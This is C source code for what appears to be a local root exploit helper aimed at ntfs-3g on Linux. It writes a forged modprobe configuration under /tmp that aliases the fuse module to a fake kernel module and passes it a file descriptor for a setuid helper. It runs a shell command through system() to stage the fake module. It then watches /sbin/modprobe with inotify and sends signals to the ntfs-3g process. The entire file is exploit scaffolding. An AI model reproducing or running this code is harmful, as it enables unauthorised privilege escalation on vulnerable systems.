#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN ( 1024 * ( EVENT_SIZE + 16 ) )

struct ModConf_dirs {
    char temp_dir_name[30];
    char modprobed[30];
};


struct ModConf_dirs prepare_module_configuration(void);
int file_monitor(char *, pid_t);
void signal_handler(int);


/******************************************************************/

struct ModConf_dirs prepare_module_configuration(void) {

    time_t timer;
    char temp_dir_name[30] = {0};
    struct tm* tm_info;
    struct stat st = {0};

    time(&timer);
    tm_info = localtime(&timer);

    strftime(temp_dir_name, 30, "/tmp/%Y%m%d%H%M%S", tm_info);
    puts(temp_dir_name);

    if (stat(temp_dir_name, &st) == -1) {
        mkdir(temp_dir_name, 0777);
    }

    char modprobed[50] = {0};
    char modprobe_conffile[50] = {0};
    int mkdir_status;

    sprintf(modprobed, "%s/modprobe.d", temp_dir_name);
    mkdir_status = mkdir(modprobed, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    if (mkdir_status == -1) {
        perror("Error: Could not create modprobe.d directory");
    }

    sprintf(modprobe_conffile, "%s/fakemodule.conf", modprobed);

    int modprobe_conf_fd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);
    if (modprobe_conf_fd == -1) {
        perror ("Error: Could not create/open the Modprobe configuration file");
    }
    int suidfile_fd = open("/tmp/h", O_RDONLY);
    if (suidfile_fd == -1) {
        perror ("Error: We were not able to open /tmp/h - MOSDEF Helper");
    }

    char modprobe_config[200];
    sprintf(modprobe_config, "alias fuse fakemodule\noptions fakemodule myfd=%d\n", suidfile_fd);
    if (write(modprobe_conf_fd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config)) {
        perror("Error: We were not able to write to the Modprobe configuration file");
    }
    close(modprobe_conf_fd);

    char mkdir_cmd[200];
    sprintf(mkdir_cmd, "mkdir -p %s/lib/modules/$(uname -r) && cp fakemodule.ko *.bin %s/lib/modules/$(uname -r)/",
        temp_dir_name, temp_dir_name);
    if (system(mkdir_cmd)) {
        perror("Error: We were not able to create proper library-fake_module diretories");
    }

    struct ModConf_dirs mcd;
    strncpy(mcd.temp_dir_name, temp_dir_name, 30);
    strncpy(mcd.modprobed, modprobed, 30);
    return mcd;
}

int file_monitor(char *file_to_monitor, pid_t ntfs3g_pid) {

    int length, i=0;
    char buffer[EVENT_BUF_LEN] = {0};
    static int event_mask =   
    (IN_ACCESS |       /* File accessed */
    IN_ATTRIB |        /* File attributes changed */
    IN_OPEN   |        /* File was opened */
    IN_CLOSE_WRITE |   /* Writtable File closed */
    IN_CLOSE_NOWRITE | /* Unwrittable File closed */
    IN_CREATE |        /* File created in directory */
    IN_DELETE |        /* File deleted in directory */
    IN_DELETE_SELF |   /* Directory deleted */
    IN_MODIFY |        /* File modified */
    IN_MOVE_SELF |     /* Directory moved */
    IN_MOVED_FROM |    /* File moved away from the directory */
    IN_MOVED_TO);      /* File moved into the directory */

    int fd = inotify_init();
    if ( fd < 0 ) { 
      perror("Error: We were not able to instantiate an inotify watcher");
    }

    int wd = inotify_add_watch(fd, file_to_monitor, event_mask);
    printf("Waiting for any event on file: %s\n", file_to_monitor);

    length = read( fd, buffer, EVENT_BUF_LEN );  
    if ( length < 0 ) { 
      perror("Error: There was an error trying to read from the inotify file descriptor");
    }

    /* The read above should return a list of changing events, we'll read them one by one. */
    while ( i < length ) { 
        struct inotify_event *event = (struct inotify_event *) &buffer[i];
        printf("File %s was accessed. Mask: %d\n", file_to_monitor, event->mask);
        kill(ntfs3g_pid, SIGUSR1);
        i+= EVENT_SIZE + event->len;
    }   
    inotify_rm_watch(fd, wd);
    close(fd);
    return 0;
}

void signal_handler(int signal) {
    puts("/sbin/modprobe was accessed. No matter if exploit successed or not, we shutdown everything");
    kill(getpid(), SIGKILL);
}
